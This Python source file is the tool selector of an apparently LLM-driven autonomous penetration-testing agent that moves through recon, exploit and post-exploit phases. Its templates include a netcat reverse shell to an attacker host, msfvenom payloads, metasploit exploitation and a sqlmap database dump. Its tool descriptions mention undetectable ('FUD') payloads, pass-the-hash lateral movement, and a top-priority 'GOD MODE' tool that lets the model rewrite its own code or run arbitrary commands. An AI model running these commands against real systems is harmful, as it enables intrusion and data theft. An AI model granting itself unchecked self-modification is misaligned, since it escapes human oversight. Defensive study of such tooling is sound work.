# core/execution/tool_selector.py
# DRAKBEN Tool Selector - DETERMINISTIC TOOL SELECTION
# REQUIRED: LLM tool selection limited to state.remaining_attack_surface
# NEW: KaliDetector integration - only available tools

import logging
from dataclasses import dataclass
from enum import Enum
from typing import Any

from core.agent.state import AgentState, AttackPhase

logger = logging.getLogger(__name__)

# Kali entegrasyonu
try:
    from core.security.kali_detector import KaliDetector

    KALI_AVAILABLE = True
except ImportError:
    KALI_AVAILABLE = False


class ToolCategory(Enum):
    """Tool categories."""

    RECON = "recon"
    VULN_SCAN = "vulnerability_scan"
    EXPLOIT = "exploit"
    PAYLOAD = "payload"
    POST_EXPLOIT = "post_exploit"


@dataclass
class ToolSpec:
    """Tool specification."""

    name: str
    category: ToolCategory
    command_template: str
    phase_allowed: list[AttackPhase]
    requires_foothold: bool = False
    risk_level: str = "low"
    max_failures: int = 2
    system_tool: str = ""  # System tool name (nmap, sqlmap etc.)
    priority: int = 50  # Priority score for Self-Evolution (0-100)
    description: str = ""  # Tool description (for LLM)


class ToolSelector:
    """Deterministic tool selection mechanism.

    FEATURES:
    - Evolutionary Strategy: Changes tool priority based on past success
    - Deterministic: Rule-based selection
    """

    # GLOBAL REGISTRY for plugins (Shared across all instances)
    _GLOBAL_PLUGIN_REGISTRY: dict[str, "ToolSpec"] = {}

    @classmethod
    def register_global_plugins(cls, new_tools: dict[str, ToolSpec]) -> None:
        """Register plugins globally so all future instances inherit them."""
        cls._GLOBAL_PLUGIN_REGISTRY.update(new_tools)
        logger.info("Registered %s global plugin tools.", len(new_tools))

    def evolve_strategies(self, evolution_memory) -> None:
        """EVOLUTION MODULE: Update strategy based on success rates in memory.

        Args:
            evolution_memory: EvolutionMemory instance (new system)

        """
        logger.info("Analyzing tool performance from memory...")
        evolved_count = 0

        for tool_name in self.tools:
            if self._update_tool_priority_from_memory(tool_name, evolution_memory):
                evolved_count += 1

        if evolved_count > 0:
            logger.info("Evolution: Strategies updated for %s tools", evolved_count)
        else:
            logger.debug("Evolution: No changes needed")

    def _update_tool_priority_from_memory(
        self,
        tool_name: str,
        evolution_memory,
    ) -> bool:
        """Update single tool priority based on evolution memory. Returns True if changed."""
        penalty = evolution_memory.get_penalty(tool_name)
        is_blocked = evolution_memory.is_tool_blocked(tool_name)

        original_priority = self.tools[tool_name].priority
        new_priority = original_priority

        # Block tool if it's blocked in evolution memory
        if is_blocked:
            new_priority = 0
            logger.warning("Tool blocked - %s: Too many failures", tool_name)
        # Evolution Logic based on penalty
        elif penalty == 0:
            new_priority = min(100, original_priority + 20)  # Boost - no failures
        elif penalty >= 5:
            new_priority = max(10, original_priority - 20)  # Nerf - many failures
        elif penalty >= 2:
            new_priority = max(30, original_priority - 10)  # Slight nerf

        if new_priority != original_priority:
            self.tools[tool_name].priority = new_priority
            logger.info(
                f"Evolved {tool_name}: Priority {original_priority} -> {new_priority} (Penalty: {penalty})",
            )
            return True
        return False

    def register_dynamic_tool(
        self,
        name: str,
        phase: AttackPhase,
        command_template: str = "{target}",
    ) -> None:
        """SELF-EVOLUTION: Register dynamically created tool."""
        self.tools[name] = ToolSpec(
            name=name,
            category=ToolCategory.EXPLOIT,  # Usually custom scripts are for exploit/recon
            command_template=command_template,
            phase_allowed=[phase, AttackPhase.POST_EXPLOIT],
            risk_level="high",  # Custom code is always risky
            priority=80,  # Priority testing since newly created
        )

    def register_plugin_tools(self, new_tools: dict[str, ToolSpec]) -> None:
        """PLUGIN INTEGRATION: Register tools loaded from external plugins.
        Overrides existing tools if names collide (user overriding system defaults).
        """
        if not new_tools:
            return

        count = 0
        for name, spec in new_tools.items():
            self.tools[name] = spec
            count += 1

        if count > 0:
            logger.info("Registered %s external plugin tools.", count)

    def __init__(self) -> None:
        # Kali tool check
        self.kali_detector = KaliDetector() if KALI_AVAILABLE else None
        self.available_system_tools = {}
        if self.kali_detector:
            self.available_system_tools = self.kali_detector.get_available_tools()

        # Tool registry - PREDEFINED
        self.tools: dict[str, ToolSpec] = {
            # RECON tools
            "nmap_port_scan": ToolSpec(
                name="nmap_port_scan",
                category=ToolCategory.RECON,
                command_template="nmap -p- -T4 {target}",
                phase_allowed=[AttackPhase.INIT, AttackPhase.RECON],
                risk_level="low",
            ),
            "nmap_service_scan": ToolSpec(
                name="nmap_service_scan",
                category=ToolCategory.RECON,
                command_template="nmap -sV -p{ports} {target}",
                phase_allowed=[AttackPhase.RECON],
                risk_level="low",
            ),
            "passive_recon": ToolSpec(
                name="passive_recon",
                category=ToolCategory.RECON,
                command_template="",  # No command - Python module call
                phase_allowed=[AttackPhase.INIT, AttackPhase.RECON],
                risk_level="low",
                system_tool="",  # Built-in Python module
            ),
            # VULN SCAN tools
            "nmap_vuln_scan": ToolSpec(
                name="nmap_vuln_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="nmap --script vuln -p{port} {target}",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium",
            ),
            "nikto_web_scan": ToolSpec(
                name="nikto_web_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="nikto -h {target} -p {port}",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium",
            ),
            "sqlmap_scan": ToolSpec(
                name="sqlmap_scan",
                category=ToolCategory.VULN_SCAN,
                command_template="sqlmap -u {target} --batch --level=1",
                phase_allowed=[AttackPhase.VULN_SCAN],
                risk_level="medium",
            ),
            # EXPLOIT tools
            "sqlmap_exploit": ToolSpec(
                name="sqlmap_exploit",
                category=ToolCategory.EXPLOIT,
                command_template="sqlmap -u {target} --batch --dump",
                phase_allowed=[AttackPhase.EXPLOIT],
                risk_level="high",
            ),
            "metasploit_exploit": ToolSpec(
                name="metasploit_exploit",
                category=ToolCategory.EXPLOIT,
                command_template="msfconsole -q -x 'use {exploit}; set RHOSTS {target}; exploit'",
                phase_allowed=[AttackPhase.EXPLOIT],
                risk_level="high",
            ),
            # PAYLOAD tools
            "msfvenom_payload": ToolSpec(
                name="msfvenom_payload",
                category=ToolCategory.PAYLOAD,
                command_template="msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD],
                requires_foothold=False,
                risk_level="high",
            ),
            "reverse_shell": ToolSpec(
                name="reverse_shell",
                category=ToolCategory.PAYLOAD,
                command_template="nc -e /bin/bash {lhost} {lport}",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD],
                requires_foothold=False,
                risk_level="critical",
            ),
            # POST-EXPLOIT tools
            "privilege_escalation": ToolSpec(
                name="privilege_escalation",
                category=ToolCategory.POST_EXPLOIT,
                command_template="sudo -l",
                phase_allowed=[AttackPhase.POST_EXPLOIT],
                requires_foothold=True,
                risk_level="high",
            ),
            "lateral_movement": ToolSpec(
                name="lateral_movement",
                category=ToolCategory.POST_EXPLOIT,
                command_template="ssh {target}",
                phase_allowed=[AttackPhase.POST_EXPLOIT],
                requires_foothold=True,
                risk_level="critical",
            ),
            # SWARM INTELLIGENCE (HIVE MIND)
            "hive_mind_scan": ToolSpec(
                name="hive_mind_scan",
                category=ToolCategory.RECON,
                command_template="INTERNAL_MODULE",
                phase_allowed=[AttackPhase.RECON, AttackPhase.POST_EXPLOIT],
                risk_level="medium",
                system_tool="",
                description="Swarm intelligence network scan for lateral movement targets",
            ),
            "hive_mind_attack": ToolSpec(
                name="hive_mind_attack",
                category=ToolCategory.POST_EXPLOIT,
                command_template="INTERNAL_MODULE",
                phase_allowed=[AttackPhase.POST_EXPLOIT],
                requires_foothold=True,
                risk_level="critical",
                system_tool="",
                description="Perform lateral movement attacks (SSH/Pass-the-Hash)",
            ),
            # WEAPON FOUNDRY (CUSTOM PAYLOADS)
            "generate_payload": ToolSpec(
                name="generate_payload",
                category=ToolCategory.PAYLOAD,
                command_template="INTERNAL_MODULE",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD],
                risk_level="medium",
                system_tool="",
                description="Generate FUD payloads using WeaponFoundry (Anti-Debug/Encryption)",
            ),
            # SINGULARITY (CODE SYNTHESIS)
            "synthesize_code": ToolSpec(
                name="synthesize_code",
                category=ToolCategory.EXPLOIT,
                command_template="INTERNAL_MODULE",
                phase_allowed=[
                    AttackPhase.EXPLOIT,
                    AttackPhase.RECON,
                    AttackPhase.POST_EXPLOIT,
                ],
                risk_level="high",
                system_tool="",
                description="Generate custom Python/Go scripts for unique attack vectors",
            ),
            # SOCIAL ENGINEERING (OSINT)
            "osint_scan": ToolSpec(
                name="osint_scan",
                category=ToolCategory.RECON,
                command_template="INTERNAL_MODULE",
                phase_allowed=[AttackPhase.RECON],
                risk_level="low",
                system_tool="",
                description="Perform OSINT and profile target",
            ),
            # ADVANCED / CREATIVE tools
            "generic_command": ToolSpec(
                name="generic_command",
                category=ToolCategory.EXPLOIT,
                command_template="{command}",
                phase_allowed=[AttackPhase.EXPLOIT, AttackPhase.POST_EXPLOIT],
                risk_level="critical",
                max_failures=1,  # One strike and you're out
            ),
            # GOD MODE / SELF-EVOLUTION
            "system_evolution": ToolSpec(
                name="system_evolution",
                category=ToolCategory.EXPLOIT,
                command_template="INTERNAL: {action} {target}",
                phase_allowed=[
                    AttackPhase.INIT,
                    AttackPhase.RECON,
                    AttackPhase.VULN_SCAN,
                    AttackPhase.EXPLOIT,
                    AttackPhase.POST_EXPLOIT,
                ],
                risk_level="critical",
                priority=100,  # Max priority
                description="Modify system code or create new tools. Args: action='create_tool'|'modify_file', target='name/path', instruction='...'",
            ),
        }

        # Fallback map for when primary tools fail
        # "failed_tool" -> ["alternative1", "alternative2"]
        self.fallback_map: dict[str, list[str]] = {
            "nmap_port_scan": [],
            "nmap_service_scan": [],
            "nikto_web_scan": [],
            "sqlmap_scan": [],
            "metasploit_exploit": [],
        }

        # Tool failure tracking (tool selector internal state)
        self.failed_tools: dict[str, int] = {}

        # Load Global Plugins (Enterprise Architecture)
        self.register_plugin_tools(self._GLOBAL_PLUGIN_REGISTRY)

    def get_allowed_tools(self, state: AgentState) -> list[str]:
        """Return allowed tools based on state.

        RULES:
        - Must match current phase
        - If requires foothold, foothold must exist
        - Must not be blocked
        """
        allowed = []

        for tool_name, spec in self.tools.items():
            # Phase check
            if state.phase not in spec.phase_allowed:
                continue

            # Foothold check
            if spec.requires_foothold and not state.has_foothold:
                continue

            # Blocked check
            if self.is_tool_blocked(tool_name, spec.max_failures):
                continue

            allowed.append(tool_name)

        # ğŸ§  DECISION LOGIC: Sort by priority (Evolutionary outcome)
        # Higher priority tools appear first in the list
        allowed.sort(key=lambda t: self.tools[t].priority, reverse=True)

        return allowed

    def select_tool_for_surface(
        self,
        state: AgentState,
        surface: str,
    ) -> tuple[str, dict[str, Any]] | None:
        """Select appropriate tool for a specific attack surface.

        Args:
            state: Current agent state
            surface: Attack surface string (format: "port:service")

        Returns:
            Tuple of (tool_name, params_dict) or None if no suitable tool

        """
        # Parse surface
        try:
            port_str, service = surface.split(":")
            port = int(port_str)
        except (ValueError, IndexError):
            return None

        # Get allowed tools
        allowed_tools = self.get_allowed_tools(state)

        # Select based on phase and service
        if state.phase == AttackPhase.RECON:
            # Service version detection
            if "nmap_service_scan" in allowed_tools:
                return ("nmap_service_scan", {"target": state.target, "ports": port})

        elif state.phase == AttackPhase.VULN_SCAN:
            # Web service - use web scanner
            if service in ["http", "https"] and "nikto_web_scan" in allowed_tools:
                return ("nikto_web_scan", {"target": state.target, "port": port})

            # Generic vuln scan
            if "nmap_vuln_scan" in allowed_tools:
                return ("nmap_vuln_scan", {"target": state.target, "port": port})

        elif state.phase == AttackPhase.EXPLOIT:
            # SQL injection possible
            if (
                service in ["http", "https", "mysql", "postgres"]
                and "sqlmap_scan" in allowed_tools
            ):
                return ("sqlmap_scan", {"target": f"http://{state.target}:{port}"})

        return None

    def validate_tool_selection(
        self,
        tool_name: str,
        state: AgentState,
    ) -> tuple[bool, str]:
        """Check if tool selection is valid.

        Returns:
            (valid, reason) tuple

        """
        # Tool exists?
        if tool_name not in self.tools:
            return False, f"Unknown tool: {tool_name}"

        spec = self.tools[tool_name]

        # Phase check
        if state.phase not in spec.phase_allowed:
            return False, f"Tool {tool_name} not allowed in phase {state.phase.value}"

        # Foothold check
        if spec.requires_foothold and not state.has_foothold:
            return False, f"Tool {tool_name} requires foothold"

        # Blocked check
        if self.is_tool_blocked(tool_name, spec.max_failures):
            return False, f"Tool {tool_name} is blocked due to repeated failures"

        return True, "Valid"

    def record_tool_failure(self, tool_name: str) -> None:
        """Record tool failure (selector-local)."""
        self.failed_tools[tool_name] = self.failed_tools.get(tool_name, 0) + 1

    def is_tool_blocked(self, tool_name: str, max_failures: int = 2) -> bool:
        """Check if tool is blocked? (2 failures -> block)."""
        return self.failed_tools.get(tool_name, 0) >= max_failures

    def recommend_next_action(self, state: AgentState) -> tuple[str, str, dict] | None:
        """Recommend next action based on state - DETERMINISTIC.

        Returns:
            (action_type, tool_name, args) or None

        """
        # Check if we have remaining attack surface
        remaining = state.get_available_attack_surface()

        # 1. INIT phase → always start with port scan
        if state.phase == AttackPhase.INIT:
            return ("scan", "nmap_port_scan", {})

        # 2. Try to scan remaining surfaces
        if remaining and state.phase in [AttackPhase.RECON, AttackPhase.VULN_SCAN]:
            scan_action = self._recommend_surface_scan(state, remaining[0])
            if scan_action:
                return scan_action

        # 3. Check if we should move to next phase
        transition = self._recommend_phase_transition(state)
        if transition:
            return transition

        # 4. Check if we have exploitable vulns
        if state.phase == AttackPhase.EXPLOIT:
            return self._recommend_exploit(state)

        # 5. Post-exploit phase
        if state.phase == AttackPhase.POST_EXPLOIT:
            return ("complete", "report", {"next_phase": AttackPhase.COMPLETE})

        return None

    def _recommend_surface_scan(
        self,
        state: AgentState,
        surface: str,
    ) -> tuple[str, str, dict] | None:
        """Recommend a scan action for a specific surface."""
        tool_result = self.select_tool_for_surface(state, surface)
        if tool_result:
            tool_name, args = tool_result
            return ("scan_surface", tool_name, args)
        return None

    def _recommend_phase_transition(
        self,
        state: AgentState,
    ) -> tuple[str, str, dict] | None:
        """Recommend a phase transition if applicable."""
        # INIT → RECON (always after first scan)
        if state.phase == AttackPhase.INIT and state.open_services:
            return (
                "phase_transition",
                "recon",
                {"next_phase": AttackPhase.RECON},
            )

        # RECON → VULN_SCAN
        if state.phase == AttackPhase.RECON and state.open_services:
            return (
                "phase_transition",
                "vuln_scan",
                {"next_phase": AttackPhase.VULN_SCAN},
            )

        # VULN_SCAN → EXPLOIT (when vulns found)
        if state.phase == AttackPhase.VULN_SCAN and state.vulnerabilities:
            return (
                "phase_transition",
                "exploit",
                {"next_phase": AttackPhase.EXPLOIT},
            )

        # VULN_SCAN → COMPLETE (no vulns found, scan finished)
        if state.phase == AttackPhase.VULN_SCAN and not state.get_available_attack_surface():
            return (
                "phase_transition",
                "complete",
                {"next_phase": AttackPhase.COMPLETE},
            )

        # EXPLOIT → POST_EXPLOIT (foothold gained)
        if state.phase == AttackPhase.EXPLOIT and state.has_foothold:
            return (
                "phase_transition",
                "post_exploit",
                {"next_phase": AttackPhase.POST_EXPLOIT},
            )

        # EXPLOIT → COMPLETE (all exploits attempted, no foothold)
        if state.phase == AttackPhase.EXPLOIT:
            all_attempted = all(v.exploit_attempted for v in state.vulnerabilities)
            if all_attempted:
                return (
                    "phase_transition",
                    "complete",
                    {"next_phase": AttackPhase.COMPLETE},
                )

        return None

    def _recommend_exploit(self, state: AgentState) -> tuple[str, str, dict] | None:
        """Recommend an exploit action."""
        for vuln in state.vulnerabilities:
            if vuln.exploitable and not vuln.exploit_attempted:
                # Try to exploit
                tool_name = self._get_exploit_tool_for_vuln(vuln)
                if tool_name:
                    return ("exploit_vuln", tool_name, {"vuln_id": vuln.vuln_id})
        return None

    def _get_exploit_tool_for_vuln(self, vuln) -> str | None:
        """Select appropriate exploit tool for vulnerability."""
        if "sql" in vuln.vuln_id.lower():
            return "sqlmap_exploit"
        return "metasploit_exploit"
